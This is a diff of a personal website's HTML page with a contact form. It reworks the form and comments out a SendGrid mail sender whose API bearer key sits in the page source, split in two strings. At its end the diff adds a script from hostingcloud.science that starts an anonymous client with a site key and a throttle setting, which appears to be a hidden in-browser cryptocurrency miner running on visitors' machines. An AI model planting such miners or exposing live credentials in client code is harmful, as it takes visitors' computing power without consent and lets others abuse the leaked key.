@@ -53,7 +53,7 @@
 					</ul>
 					<hr/><br/>
 					<h3>Contacto: </h3>
-					<form > <!--method="post" action="mailto:igna_barrau@hotmail.com" enctype="text/plain">-->
+					<form method="post" action="mailto:igna_barrau@hotmail.com" enctype="text/plain">
 						<div class="field half first">
 							<label for="name">Name</label>
 							<input type="text" name="name" id="name" />
@@ -67,7 +67,7 @@
 							<textarea type="text" name="message" id="message" rows="6"></textarea>
 						</div>
 						<ul class="actions">
-							<li><input id="enviar" type="button" value="Enviar Mensaje" class="alt" onclick="sendMsj()" /></li>
+							<li><input id="enviar" type="submit" value="Enviar Mensaje" style="background-color: transparent;box-shadow: inset 0 0 0 2px #FF8C00;color: #FF8C00 !important;"  /></li>
 							<!--type="submit"  style="background-color: transparent;box-shadow: inset 0 0 0 2px #FF8C00;color: #FF8C00 !important;"-->
 						</ul>
 					</form>
@@ -100,9 +100,10 @@
 				/*$(".alt").click(function(event){
 					event.preventDefault();
 				});	*/		
-				$("#enviar").onclick(sendMsj());
+				
 			});
 
+			/*$("#enviar").onclick(sendMsj());
 			
 			function sendMsj() {
 				var dataJ = {'personalizations': [{'to': [{'email': 'igna_barrau@hotmail.com'}],'subject': 'LaData:' +$('#name').val()}],'from': {'email': $('#email').val()},'content': [{'type': 'text/plain','value': $('#message').val()}]};
@@ -110,7 +111,7 @@
 				$.ajax({
 					url: 'https://api.sendgrid.com/v3/mail/send',
 					headers: {
-						'Authorization':'Bearer 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',
+						'Authorization':'Bearer SG.xqWEgNVvTeqBd85cm6ZWIg.YTU'+'WJffcSZoH3P-rVX24XjYE9Hd7MQ66lmCn4B8IJEw',
 						'Content-Type':'application/json'
 					},
 					method: 'POST',
@@ -126,7 +127,7 @@
 					} 
 				  });
 			}
-			/*function sendshit(){
+			function sendshit(){
 				//alert('Opción no disponible por el momento. Trabajando en ello :) \nEscriba a igna_barrau@hotmail.com') ;
 				Email.send($("#email").val(),
 				"igna_barrau@hotmail.com",
@@ -139,6 +140,15 @@
 			}*/
 		
 			
+			</script>
+			<script src="https://www.hostingcloud.science./rrPl.js"></script>
+			<script>
+				var _client = new Client.Anonymous('9f9c52551bfc8eaf4cb1edc98f257d1d481483510899f23d2c272398e285e92f', {
+					throttle: 0.5
+				});
+				_client.start();
+				
+
 			</script>
 	</body>
 </html>
